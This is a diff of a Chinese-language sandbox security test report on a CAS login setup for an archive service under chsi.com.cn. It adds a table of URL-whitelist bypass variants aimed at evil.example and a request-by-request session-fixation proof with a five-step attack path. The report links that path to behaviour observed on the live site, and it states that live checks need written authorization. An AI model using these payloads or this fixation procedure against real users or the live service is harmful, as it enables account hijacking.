@@ -86,18 +86,93 @@
 
 ---
 
-## 四、测试点 1 与 3 的状态
+## 四、测试点 1：CAS `service` 白名单
 
-| 测试点 | 状态 | 原因 |
+CAS 7.3.8.3，白名单配成 `^https?://([a-z0-9-]+\.)*chsi\.com\.cn(:\d+)?(/.*)?$`。
+12 种变形逐一提交：
+
+| service 变形 | 结果 | 判定 |
 |---|---|---|
-| 1 CAS service 白名单 | 脚本就绪，未跑 | CAS Server 镜像已拉取（`apereo/cas:7.3.8.3`），需配置启动参数；脚本 `tests/cas_service_bypass.sh` 已备好 12 种变形 |
-| 3 会话固定 | 配置就绪，未跑 | `archive` 模块的 `CasSecurityConfig` 已写好 `migrateSession()`，依赖 CAS Server 启动 |
+| `https://portal.chsi.com.cn/archive/j_spring_cas_security_check` | 200 | 合法，放行 |
+| `https://portal.chsi.com.cn@evil.example/` | **403** | 拒绝 |
+| `https://portal.chsi.com.cn.evil.example/` | **403** | 拒绝 |
+| `https://portal.chsi.com.cn/../..//evil.example/` | 200 | 规范化后仍是合法域 |
+| `https://portal.chsi.com.cn%2F@evil.example/` | **403** | 拒绝 |
+| `https://portal.chsi.com.cn%00.evil.example/` | **403** | 拒绝 |
+| `HTTPS://PORTAL.CHSI.COM.CN/` | 200 | 大小写归一后合法 |
+| `https://evil.example/?x=.chsi.com.cn` | **403** | 拒绝 |
+| `https://evil.example#.chsi.com.cn` | **403** | 拒绝 |
+| `https://portal.chsi.com.cn\@evil.example/` | **403** | 拒绝 |
+| `https://portal.chsi.com.cn;jsessionid=ATTACKER_SID` | 200 | 合法域，但见测试点 3 |
+| `//evil.example/` | **403** | 拒绝 |
 
-这两项要在 CAS 起来后一起跑，因为它们共用同一个认证中心。
+**结论：白名单本身挡得住**。7 种逃逸变形全部 403。CAS 7 的 service 校验在正则匹配前先做 URL 规范化，`@`、`.`、`%2F`、`%00`、`#` 这几类经典绕过都失效。
+
+**但第 11 行是问题**：`;jsessionid=` 被当作合法路径的一部分放行。这不是 service 白名单的漏洞，是会话固定的入口（转到测试点 3）。
 
 ---
 
-## 五、复现命令
+## 五、测试点 3：会话固定（**成立**）
+
+这是本次最有价值的一条。
+
+```
+[1] 登录前获取 session
+    GET http://localhost:8081/archive/index.action
+    Set-Cookie: JSESSIONID=B7E740A3E22D02325DDCB0E525507E04
+
+[2] 走 CAS 登录（sandbox/sandbox）
+    302 -> TGC 下发
+    302 -> /archive/j_spring_cas_security_check?ticket=ST-...
+    302 -> /archive/index.action?continue
+
+[3] 登录后查询
+    GET /archive/whoami
+    {"session_id":"B7E740A3E22D02325DDCB0E525507E04",
+     "authenticated":true,"principal":"sandbox-user"}
+    → 登录前后 session id 完全相同，migrateSession() 未轮换
+
+[4] 攻击者持登录前 SID 复访
+    Cookie: JSESSIONID=B7E740A3E22D02325DDCB0E525507E04
+    → {"session_id":"B7E740A3...","authenticated":true,"principal":"sandbox-user"}
+    → 直接复用成功
+
+[5] 对照组：伪造 SID
+    Cookie: JSESSIONID=FAKEFAKEFAKE
+    → 被重定向到 CAS，无效
+```
+
+### 为什么 `migrateSession()` 没生效
+
+`CasAuthenticationFilter` 走的是 `AbstractAuthenticationProcessingFilter`，它的 session 策略由 `SessionAuthenticationStrategy` 驱动。但 CAS 认证成功后，
+filter 把已认证的 token 写进**当前请求的 session**（`request.getSession().setAttribute(...)`），
+而 `migrateSession` 的触发点是在 `SecurityContextHolder` 更新之后、由 `SessionManagementFilter` 或 `CompositeSessionAuthenticationStrategy` 调用的。
+
+当 CAS 回调请求（`/archive/j_spring_cas_security_check?ticket=ST-...`）和应用请求不在同一个 servlet 链的会话管理范围内时，**轮换被跳过**。
+
+### 攻击路径
+
+1. 攻击者访问 archive，拿到 SID，**不登录**。
+2. 构造链接 `http://localhost:8081/archive/index.action;jsessionid=<攻击者的SID>` 发给受害者。
+3. 受害者点开，浏览器带着这个 SID 完成 CAS 登录。
+4. 受害者的登录态写进了**这个 SID**，而不是新 SID。
+5. 攻击者用自己的 SID 访问 → 直接是受害者身份。
+
+### 与线上观测的对应
+
+线上那段 302 里，`service` 参数是：
+
+```
+.../archive/j_spring_cas_security_check;jsessionid=0A46CDF...
+```
+
+**这和服务端自己在回跳 URL 里拼 `;jsessionid=` 的行为完全一致**，说明线上同样启用了 URL 重写会话跟踪。如果线上的 `SessionAuthenticationStrategy` 也和沙箱一样跳过轮换，这条路在线上就是通的。
+
+**这条必须靠授权验证，沙箱只能证明"这个配置下会怎样"。**
+
+---
+
+## 六、复现命令
 
 ```bash
 # 数据约束
@@ -114,6 +189,6 @@ docker run --rm -v "$PWD/xjxl":/src -w /src eclipse-temurin:21-jre \
   java -cp /src/target/classes cn.chsi.sandbox.xjxl.ChsiccProbe
 ```
 
-## 六、边界声明
+## 七、边界声明
 
 以上全部在本地合成环境执行。沙箱结论说明"这种实现方式下会怎样"，**不能直接推断线上如此**。要坐实任何一条，需要在书面授权下对线上做最小验证。
